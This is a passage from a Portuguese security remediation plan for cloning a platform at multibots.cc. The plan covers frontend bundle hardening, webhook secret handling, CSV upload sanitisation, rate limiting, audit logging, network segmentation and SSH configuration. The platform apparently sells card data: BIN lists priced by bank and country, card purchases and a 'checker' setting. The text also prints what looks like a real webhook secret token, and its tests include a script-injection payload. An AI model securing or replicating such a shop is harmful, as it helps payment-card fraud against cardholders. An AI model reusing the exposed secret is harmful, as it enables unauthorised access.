        pure_funcs: ['console.log', 'console.debug', 'console.info']
      },
      mangle: {
        toplevel: true,          // Ofuscar nomes de funcoes top-level
        properties: {
          // Ofuscar propriedades (cuidado: pode quebrar)
          // Descomentar somente apos testes extensivos
          // regex: /^_/  // Ofuscar propriedades que comecam com _
        }
      },
      format: {
        comments: false          // Remover todos os comentarios
      }
    },

    // 2. Code splitting por role
    rollupOptions: {
      output: {
        manualChunks: {
          // Separar rotas admin em chunk diferente
          'admin': [
            './src/pages/admin/Dashboard.jsx',
            './src/pages/admin/Settings.jsx',
            './src/pages/admin/Cards.jsx',
            // ... todas as paginas admin
          ],
          // Separar superadmin
          'superadmin': [
            './src/pages/superadmin/Panel.jsx',
            // ... todas as paginas superadmin
          ],
          // Chunk de usuario (publico)
          'user': [
            './src/pages/user/Home.jsx',
            './src/pages/user/Profile.jsx',
          ],
          // Vendor separado
          'vendor': ['react', 'react-dom', 'react-router-dom'],
        }
      }
    },

    // 3. NAO gerar source maps em producao
    sourcemap: false,

    // 4. Hashes nos nomes de arquivo
    assetsDir: 'assets',
    chunkSizeWarningLimit: 500,
  }
});


// ==============================================================
// frontend/src/router.jsx — Lazy loading por role
// ==============================================================

import { lazy, Suspense } from 'react';
import { Routes, Route } from 'react-router-dom';

// Lazy loading: chunks admin/superadmin so carregam quando necessario
const AdminDashboard = lazy(() => import('./pages/admin/Dashboard'));
const SuperAdminPanel = lazy(() => import('./pages/superadmin/Panel'));
const UserHome = lazy(() => import('./pages/user/Home'));

function AppRouter() {
  return (
    <Suspense fallback={<div>Carregando...</div>}>
      <Routes>
        {/* Rotas publicas — no bundle principal */}
        <Route path="/" element={<UserHome />} />

        {/* Rotas admin — chunk separado, so carrega se autenticado */}
        <Route path="/admin/*" element={<AdminDashboard />} />

        {/* Rotas superadmin — chunk separado */}
        <Route path="/superadmin/*" element={<SuperAdminPanel />} />
      </Routes>
    </Suspense>
  );
}

// NOTA: As rotas com hash MD5 (/3218b365656f2f473c0d263817adaba6)
// devem ser substituidas por rotas padrao protegidas por autenticacao,
// NAO por "seguranca por obscuridade".
```

### Teste de Verificacao

```bash
# 1. Verificar que bundle nao contem rotas admin em texto puro
curl -s "https://clone.com/assets/user-*.js" | grep -ci "superadmin"
# Esperado: 0

# 2. Verificar que source maps nao existem
curl -s -o /dev/null -w "%{http_code}" "https://clone.com/assets/index-*.js.map"
# Esperado: 404

# 3. Verificar que console.log foi removido
curl -s "https://clone.com/assets/user-*.js" | grep -c "console.log"
# Esperado: 0

# 4. Verificar code splitting (multiplos chunks)
curl -s "https://clone.com/" | grep -oP 'assets/[^"]+\.js' | sort -u
# Esperado: vendor-*.js, user-*.js (admin e superadmin NAO carregados)

# 5. Verificar que hash MD5 nao e mais usado como rota
curl -s "https://clone.com/assets/user-*.js" | grep -c "3218b365656f2f473c0d263817adaba6"
# Esperado: 0
```

---

## VULN-012 — PIX Webhook Secret no Path (BAIXA)

**CVSS:** 3.7 | **Prioridade:** MEDIA
**Endpoint(s) afetado(s):** `GET /admin/automatic-pix-settings`

### Causa Raiz

O webhook URL do PIX contem o secret token diretamente no path da URL:
```
https://api.multibots.cc/api/recharge/primepix/webhook/283518/_rsCh-5PBMZRqfIqzDWTcz6mVEy4JZPY7oOtKjzR9Lw
```

Isso expoe o secret em:
- Logs de acesso do nginx/CDN
- Historico do browser
- Referrer headers
- Ferramentas de monitoramento de rede

### Como Corrigir

**Arquivo:** `backend/src/routes/recharge/pixWebhook.js`

```javascript
// ==============================================================
// ANTES (VULNERAVEL): Secret no path
// ==============================================================
// router.post('/api/recharge/primepix/webhook/:userId/:secret', ...)
// URL: /api/recharge/primepix/webhook/283518/_rsCh-5PBMZRqfIqzDW...


// ==============================================================
// DEPOIS (CORRIGIDO): Secret no header
// ==============================================================

router.post('/api/recharge/primepix/webhook/:userId',
  async (req, res) => {
    const { userId } = req.params;
    const webhookSecret = req.headers['x-webhook-secret'];

    // 1. Validar presenca do header
    if (!webhookSecret) {
      console.warn(`[SECURITY] PIX webhook sem X-Webhook-Secret. ` +
        `userId=${userId} ip=${req.ip}`);
      return res.status(401).json({ error: 'Unauthorized' });
    }

    // 2. Buscar secret esperado do tenant
    const settings = await PixSettings.findOne({ user_id: userId });
    if (!settings || !settings.webhook_secret_hash) {
      return res.status(401).json({ error: 'Unauthorized' });
    }

    // 3. Comparacao timing-safe
    const crypto = require('crypto');
    const expectedHash = settings.webhook_secret_hash;
    const receivedHash = crypto
      .createHash('sha256')
      .update(webhookSecret)
      .digest('hex');

    if (!crypto.timingSafeEqual(
      Buffer.from(expectedHash),
      Buffer.from(receivedHash)
    )) {
      console.warn(`[SECURITY] PIX webhook secret invalido. ` +
        `userId=${userId} ip=${req.ip}`);
      return res.status(401).json({ error: 'Unauthorized' });
    }

    // 4. Processar webhook normalmente...
    // ...

    res.json({ ok: true });
  }
);


// ==============================================================
// Mascarar webhook URL na resposta da API
// ==============================================================

router.get('/admin/automatic-pix-settings',
  authMiddleware,
  requireAdmin,
  async (req, res) => {
    const settings = await PixSettings.findOne({
      user_id: req.user.id
    });

    res.json({
      ...settings.toObject(),
      // Webhook URL SEM secret
      webhook_url: `https://api.clone.com/api/recharge/primepix/webhook/${req.user.id}`,
      // Secret mascarado
      webhook_secret: maskSecret(settings.webhook_secret),
      // Instrucao para o admin
      webhook_header: 'Configure o header X-Webhook-Secret no PrimePix'
    });
  }
);
```

### Teste de Verificacao

```bash
# 1. Webhook sem header — deve ser rejeitado
curl -s -X POST "https://api.clone.com/api/recharge/primepix/webhook/283518" \
  -H "Content-Type: application/json" \
  -d '{"status":"paid","amount":100}'
# Esperado: 401 {"error":"Unauthorized"}

# 2. Webhook com header correto — deve funcionar
curl -s -X POST "https://api.clone.com/api/recharge/primepix/webhook/283518" \
  -H "Content-Type: application/json" \
  -H "X-Webhook-Secret: $WEBHOOK_SECRET" \
  -d '{"status":"paid","amount":100}'
# Esperado: 200 {"ok":true}

# 3. GET settings — secret deve estar mascarado
curl -s "https://api.clone.com/admin/automatic-pix-settings" \
  -H "Authorization: Bearer $TOKEN" | jq .webhook_secret
# Esperado: "_rs****...9Lw" (mascarado)

# 4. Verificar que URL antiga com secret no path retorna 404
curl -s -o /dev/null -w "%{http_code}" -X POST \
  "https://api.clone.com/api/recharge/primepix/webhook/283518/_rsCh-5PBMZRqfIqzDW"
# Esperado: 404
```

---

## VULN-013 — CSV Upload Content Reflection (BAIXA)

**CVSS:** 2.0 | **Prioridade:** MEDIA
**Endpoint(s) afetado(s):** `POST /admin/bins/upload`

### Causa Raiz

Quando o parsing do CSV falha, a resposta de erro inclui o conteudo bruto do arquivo
uploadado no campo `sampleLines`. Isso pode levar a:

1. Reflexao de conteudo malicioso (XSS se renderizado no frontend)
2. Vazamento de dados se arquivo errado for uploadado

### Como Corrigir

**Arquivo:** `backend/src/routes/admin/bins.js`

```javascript
// ==============================================================
// backend/src/routes/admin/bins.js (CORRIGIDO)
// ==============================================================

router.post('/admin/bins/upload',
  authMiddleware,
  requireAdmin,
  upload.single('file'),
  async (req, res) => {
    try {
      // Processar CSV...
      const results = parseCSV(req.file.path);

      if (results.errors.length > 0) {
        // CORRIGIDO: NAO incluir conteudo do arquivo na resposta
        return res.status(400).json({
          error: 'Erro ao processar CSV',
          details: {
            // Mensagem generica, sem conteudo refletido
            message: 'Formato invalido. O CSV deve conter colunas: bin, brand, type, level, bank, country, price',
            errorCount: results.errors.length,
            firstErrorLine: results.errors[0]?.row || 'desconhecido',
            firstErrorType: results.errors[0]?.type || 'formato_invalido',
            // sampleLines limitado e sanitizado
            sampleLines: results.errors.slice(0, 3).map(err => ({
              line: err.row,
              type: err.type,
              // Truncar e sanitizar conteudo
              preview: sanitizePreview(err.message, 100)
            }))
          },
          expectedFormat: 'bin,brand,type,level,bank,country,price',
          exampleLine: '545368,MASTERCARD,CREDIT,STANDARD,Itau,BR,25.00'
        });
      }

      // Sucesso...
      res.json({ success: true, imported: results.data.length });

    } catch (error) {
      console.error('[BIN UPLOAD ERROR]', error);
      res.status(400).json({
        error: 'Erro ao processar arquivo',
        message: 'Verifique se o arquivo e um CSV valido no formato esperado'
      });
    }
  }
);

/**
 * Sanitiza preview de conteudo para respostas de erro.
 * Trunca e remove caracteres potencialmente perigosos.
 */
function sanitizePreview(text, maxLen = 100) {
  if (typeof text !== 'string') return '';

  return text
    .substring(0, maxLen)
    .replace(/[<>"'&]/g, '')  // Remover chars HTML
    .replace(/[\x00-\x1f]/g, '')  // Remover control chars
    .trim();
}
```

### Teste de Verificacao

```bash
# 1. Upload de CSV invalido — resposta NAO deve conter conteudo refletido
echo '<script>alert(1)</script>' > malicious.csv
curl -s -X POST "https://api.clone.com/admin/bins/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@malicious.csv" | jq .
# Esperado: {"error":"Erro ao processar CSV","details":{"message":"Formato invalido..."}}
# NAO deve conter "<script>alert(1)</script>" na resposta

# 2. Upload de CSV com dados sensiveis — NAO deve refletir
echo 'password123,secret_key,admin' > wrong_file.csv
curl -s -X POST "https://api.clone.com/admin/bins/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@wrong_file.csv" | jq .
# Esperado: mensagem generica sem "password123" ou "secret_key"

# 3. Upload de CSV valido — deve funcionar
echo 'bin,brand,type,level,bank,country,price
545368,MASTERCARD,CREDIT,STANDARD,Itau,BR,25.00' > valid.csv
curl -s -X POST "https://api.clone.com/admin/bins/upload" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@valid.csv" | jq .
# Esperado: {"success":true,"imported":1}
```

---

---

# CONTROLES DE SEGURANCA OBRIGATORIOS (NOVOS)

Alem das correcoes das 13 vulnerabilidades acima, o clone DEVE implementar os seguintes
controles de seguranca ANTES de entrar em producao.

---

## CTRL-01 — Rate Limiting Global

Rate limiting em TODOS os endpoints de negocio, nao apenas login.

**Arquivo:** `backend/src/middleware/rateLimiter.js`

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const Redis = require('ioredis');

const redis = new Redis(process.env.REDIS_URL);

// Rate limits por categoria de endpoint
const rateLimiters = {
  // Login: 5 tentativas por 15 minutos
  auth: rateLimit({
    store: new RedisStore({ sendCommand: (...args) => redis.call(...args) }),
    windowMs: 15 * 60 * 1000,
    max: 5,
    keyGenerator: (req) => `auth:${req.ip}`,
    message: { error: 'Muitas tentativas. Tente novamente em 15 minutos.' }
  }),

  // Compras: 10 por minuto por usuario
  purchase: rateLimit({
    store: new RedisStore({ sendCommand: (...args) => redis.call(...args) }),
    windowMs: 60 * 1000,
    max: 10,
    keyGenerator: (req) => `purchase:${req.user?.id || req.ip}`,
    message: { error: 'Limite de compras excedido.' }
  }),

  // APIs admin: 30 por minuto
  admin: rateLimit({
    store: new RedisStore({ sendCommand: (...args) => redis.call(...args) }),
    windowMs: 60 * 1000,
    max: 30,
    keyGenerator: (req) => `admin:${req.user?.id || req.ip}`,
    message: { error: 'Limite de requisicoes excedido.' }
  }),

  // Callbacks de pagamento: 60 por minuto por IP
  webhook: rateLimit({
    store: new RedisStore({ sendCommand: (...args) => redis.call(...args) }),
    windowMs: 60 * 1000,
    max: 60,
    keyGenerator: (req) => `webhook:${req.ip}`,
    message: { error: 'Rate limit exceeded.' }
  }),

  // Upload: 5 por minuto
  upload: rateLimit({
    store: new RedisStore({ sendCommand: (...args) => redis.call(...args) }),
    windowMs: 60 * 1000,
    max: 5,
    keyGenerator: (req) => `upload:${req.user?.id || req.ip}`,
    message: { error: 'Limite de uploads excedido.' }
  }),

  // Global: 100 requests por minuto por IP
  global: rateLimit({
    store: new RedisStore({ sendCommand: (...args) => redis.call(...args) }),
    windowMs: 60 * 1000,
    max: 100,
    keyGenerator: (req) => `global:${req.ip}`,
    standardHeaders: true,
    legacyHeaders: false,
  })
};

module.exports = rateLimiters;
```

---

## CTRL-02 — Transacoes Atomicas MongoDB

TODAS as operacoes financeiras DEVEM usar transacoes MongoDB.

```javascript
// Padrao obrigatorio para qualquer operacao financeira:
const session = await mongoose.startSession();
session.startTransaction();

try {
  // 1. Verificar saldo com lock atomico
  const user = await User.findOneAndUpdate(
    { _id: userId, balance: { $gte: amount } },
    { $inc: { balance: -amount } },
    { new: true, session }
  );

  if (!user) {
    await session.abortTransaction();
    throw new Error('Saldo insuficiente');
  }

  // 2. Executar operacao
  // ...

  // 3. Registrar auditoria
  await AuditLog.create([{
    user_id: userId,
    action: 'purchase',
    amount,
    balance_before: user.balance + amount,
    balance_after: user.balance,
    timestamp: new Date()
  }], { session });

  await session.commitTransaction();

} catch (error) {
  await session.abortTransaction();
  throw error;
} finally {
  session.endSession();
}
```

**IMPORTANTE:** MongoDB so suporta transacoes em Replica Sets. Configure:
```yaml
# docker-compose.yml
services:
  mongo:
    image: mongo:7
    command: ["--replSet", "rs0"]
```

---

## CTRL-03 — Content Security Policy (CSP)

Ja incluido na correcao da VULN-008. Verificar que os headers estao ativos:

```bash
curl -sI "https://clone.com/" | grep -i "content-security-policy\|x-content-type\|x-frame\|strict-transport"
```

Headers minimos obrigatorios:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; frame-ancestors 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-XSS-Protection: 0 (desabilitado — CSP e mais efetivo)
Referrer-Policy: strict-origin-when-cross-origin
```

---

## CTRL-04 — Helmet.js para Security Headers

```javascript
// npm install helmet
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: { /* ver VULN-008 */ },
  crossOriginEmbedderPolicy: true,
  crossOriginOpenerPolicy: true,
  crossOriginResourcePolicy: { policy: "same-origin" },
  dnsPrefetchControl: true,
  frameguard: { action: 'deny' },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  ieNoOpen: true,
  noSniff: true,
  permittedCrossDomainPolicies: { permittedPolicies: "none" },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  xssFilter: false, // Desabilitado: CSP e melhor
}));
```

---

## CTRL-05 — express-mongo-sanitize Global

Ja incluido na correcao da VULN-005. Garantir que esta ANTES de todas as rotas:

```javascript
const mongoSanitize = require('express-mongo-sanitize');

// ANTES de qualquer app.use(router)
app.use(express.json({ limit: '1mb' }));
app.use(mongoSanitize({
  replaceWith: '_',
  onSanitize: ({ req, key }) => {
    console.warn(`[NOSQLI] Blocked: key=${key} ip=${req.ip} path=${req.path}`);
  }
}));
```

---

## CTRL-06 — Validacao de Tipo em Todas as Entradas

Middleware generico para validar tipos de todos os campos:

```javascript
// npm install joi
const Joi = require('joi');

/**
 * Factory de middleware de validacao.
 * Uso: validate(schema) onde schema e um Joi schema.
 */
function validate(schema) {
  return (req, res, next) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false,
      stripUnknown: true,  // Remove campos nao declarados
      convert: false        // NAO converter tipos automaticamente
    });

    if (error) {
      return res.status(400).json({
        error: 'Dados invalidos',
        details: error.details.map(d => d.message)
      });
    }

    req.body = value; // Substituir por dados validados
    next();
  };
}

// Exemplo de schema para login
const loginSchema = Joi.object({
  username: Joi.string().min(1).max(100).required(),
  password: Joi.string().min(1).max(200).required()
});

// Exemplo de schema para compra
const purchaseSchema = Joi.object({
  cardId: Joi.number().integer().positive().required()
});

// Uso:
router.post('/api/auth/login', validate(loginSchema), loginController);
router.post('/api/purchases', validate(purchaseSchema), purchaseController);
```

---

## CTRL-07 — Audit Logging para Operacoes Sensiveis

```javascript
// backend/src/services/auditLogger.js

const AuditLog = require('../models/AuditLog');

const SENSITIVE_ACTIONS = [
  'login', 'login_failed', 'logout',
  'purchase', 'purchase_failed',
  'balance_credit', 'balance_debit',
  'gift_card_create', 'gift_card_redeem',
  'settings_update', 'checker_settings_update',
  'user_create', 'user_delete', 'role_change',
  'api_key_view', 'api_key_update',
  'webhook_received', 'webhook_rejected',
  'cross_tenant_blocked', 'nosqli_blocked',
  'ssrf_blocked', 'rate_limit_hit'
];

async function auditLog(action, details) {
  if (!SENSITIVE_ACTIONS.includes(action)) {
    console.warn(`[AUDIT] Acao desconhecida: ${action}`);
  }

  await AuditLog.create({
    action,
    user_id: details.userId || null,
    ip: details.ip || null,
    user_agent: details.userAgent || null,
    path: details.path || null,
    method: details.method || null,
    status_code: details.statusCode || null,
    details: details.extra || {},
    timestamp: new Date()
  });
}

// Middleware automatico para rotas sensiveis
function auditMiddleware(action) {
  return (req, res, next) => {
    const originalEnd = res.end;
    res.end = function(...args) {
      auditLog(action, {
        userId: req.user?.id,
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        path: req.path,
        method: req.method,
        statusCode: res.statusCode
      }).catch(err => console.error('[AUDIT ERROR]', err));

      originalEnd.apply(res, args);
    };
    next();
  };
}

module.exports = { auditLog, auditMiddleware };
```

---

## CTRL-08 — Gerenciamento de Segredos

NUNCA armazenar API keys em plaintext no banco. Usar o `secretManager.js` da VULN-007.

Checklist:
- [ ] Todas as API keys criptografadas com AES-256-GCM em repouso
- [ ] `SECRET_ENCRYPTION_KEY` em variavel de ambiente (nao no codigo)
- [ ] `.env` no `.gitignore`
- [ ] Rotacao de chaves programada (a cada 90 dias)
- [ ] Mascaramento em todas as respostas da API (ultimos 4 caracteres apenas)

---

## CTRL-09 — Reprocessamento de Uploads com Sharp

Ja incluido na correcao da VULN-010. Garantir que TODAS as rotas de upload usam o
`processImageUpload` middleware.

Checklist:
- [ ] `sharp` re-codifica toda imagem (remove EXIF, COM markers, payloads)
- [ ] Nomes de arquivo UUID (nao previsiveis)
- [ ] Diretorio de uploads FORA do webroot
- [ ] Header `X-Content-Type-Options: nosniff` em arquivos servidos

---

## CTRL-10 — Dominio Separado para Uploads

Configurar um subdominio dedicado para servir uploads com headers restritivos:

```nginx
# /etc/nginx/sites-available/uploads.conf

server {
    listen 443 ssl http2;
    server_name uploads.clone.com;

    ssl_certificate /etc/ssl/certs/uploads.clone.com.pem;
    ssl_certificate_key /etc/ssl/private/uploads.clone.com.key;

    root /var/uploads;

    # Sem execucao de scripts
    location ~ \.(php|asp|aspx|jsp|cgi|pl|py)$ {
        deny all;
        return 403;
    }

    # Headers restritivos
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Security-Policy "default-src 'none'; img-src 'self'; style-src 'none'; script-src 'none'" always;
    add_header X-Frame-Options "DENY" always;
    add_header Cache-Control "public, max-age=86400, immutable";

    # Apenas imagens
    location / {
        types {
            image/jpeg  jpg jpeg;
            image/png   png;
            image/webp  webp;
        }
        default_type application/octet-stream;
    }
}
```

---

## CTRL-11 — Segmentacao de Rede

O banco de dados NAO deve ser acessivel pela internet.

```yaml
# docker-compose.yml
services:
  api:
    networks:
      - frontend
      - backend

  mongo:
    networks:
      - backend  # SOMENTE rede interna
    # NAO expor porta 27017 no host
    # ports:
    #   - "27017:27017"  # NUNCA FAZER ISSO

  redis:
    networks:
      - backend  # SOMENTE rede interna

networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true  # Sem acesso a internet
```

Firewall (iptables/ufw):
```bash
# Bloquear acesso externo ao MongoDB
ufw deny in on eth0 to any port 27017
ufw deny in on eth0 to any port 6379

# Permitir apenas SSH de IPs conhecidos
ufw allow from ADMIN_IP to any port 22

# Permitir HTTP/HTTPS
ufw allow 80/tcp
ufw allow 443/tcp

ufw enable
```

---

## CTRL-12 — SSH Hardened

**Arquivo:** `/etc/ssh/sshd_config`

```
# Autenticacao
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AuthenticationMethods publickey
MaxAuthTries 3

# Timeouts
ClientAliveInterval 300
ClientAliveCountMax 2
LoginGraceTime 30

# Restricoes
AllowUsers deploy
PermitEmptyPasswords no
X11Forwarding no
AllowTcpForwarding no
AllowAgentForwarding no

# Logging
LogLevel VERBOSE
SyslogFacility AUTH

# Protocolos
Protocol 2
KexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
```

Aplicar:
```bash
sudo systemctl restart sshd
```

---

# CHECKLIST DE IMPLEMENTACAO

Antes de ir para producao, TODOS os itens abaixo devem estar marcados:

## Criticos (Bloqueiam deploy)
- [ ] VULN-001: Validacao de preco server-side com BIN lookup
- [ ] VULN-001: Transacao atomica MongoDB em compras
- [ ] VULN-002: Validacao de URL contra SSRF (allowlist + IP check)
- [ ] VULN-003: HMAC verification em callback crypto
- [ ] VULN-004: CORS com origin allowlist explicita
- [ ] VULN-005: express-mongo-sanitize global + type validation no login
- [ ] VULN-006: Middleware de tenant authorization em TODAS as rotas com bot_id

## Urgentes (Maximo 1 semana apos deploy)
- [ ] VULN-007: Criptografia de API keys em repouso + mascaramento em responses
- [ ] VULN-008: sanitize-html + CSP headers
- [ ] VULN-009: Limites em gift cards + debito de saldo + anti-self-redeem

## Altos (Maximo 2 semanas apos deploy)
- [ ] VULN-010: Re-codificacao de imagens com sharp + UUID filenames
- [ ] VULN-011: Code splitting + terser + sem source maps

## Medios (Maximo 1 mes apos deploy)
- [ ] VULN-012: Webhook secret no header (nao no path)
- [ ] VULN-013: Sanitizacao de respostas de erro em upload

## Controles adicionais
- [ ] CTRL-01: Rate limiting em todos os endpoints de negocio
- [ ] CTRL-02: MongoDB Replica Set + transacoes
- [ ] CTRL-03: CSP headers
- [ ] CTRL-04: Helmet.js
- [ ] CTRL-05: express-mongo-sanitize global
- [ ] CTRL-06: Joi validation em todas as rotas
- [ ] CTRL-07: Audit logging
- [ ] CTRL-08: Secret management
- [ ] CTRL-09: Sharp para uploads
- [ ] CTRL-10: Dominio separado para uploads
- [ ] CTRL-11: Segmentacao de rede (DB nao exposto)
- [ ] CTRL-12: SSH hardened (key-only, no password)

---

# DEPENDENCIAS NPM OBRIGATORIAS

```json
{
  "dependencies": {
    "bcrypt": "^5.1.1",
    "cors": "^2.8.5",
    "express": "^4.18.2",
    "express-mongo-sanitize": "^2.2.0",
    "express-rate-limit": "^7.1.5",
    "helmet": "^7.1.0",
    "ioredis": "^5.3.2",
    "ipaddr.js": "^2.1.0",
    "joi": "^17.11.0",
    "jsonwebtoken": "^9.0.2",
    "mongoose": "^8.0.3",
    "multer": "^1.4.5-lts.1",
    "rate-limit-redis": "^4.2.0",
    "sanitize-html": "^2.11.0",
    "sharp": "^0.33.2",
    "uuid": "^9.0.0"
  }
}
```

Instalar:
```bash
npm install bcrypt cors express express-mongo-sanitize express-rate-limit \
  helmet ioredis ipaddr.js joi jsonwebtoken mongoose multer rate-limit-redis \
  sanitize-html sharp uuid
```

---

**FIM DO DOCUMENTO**
**Ultima atualizacao:** 2026-08-11
**Proxima revisao obrigatoria:** Antes de qualquer deploy para producao
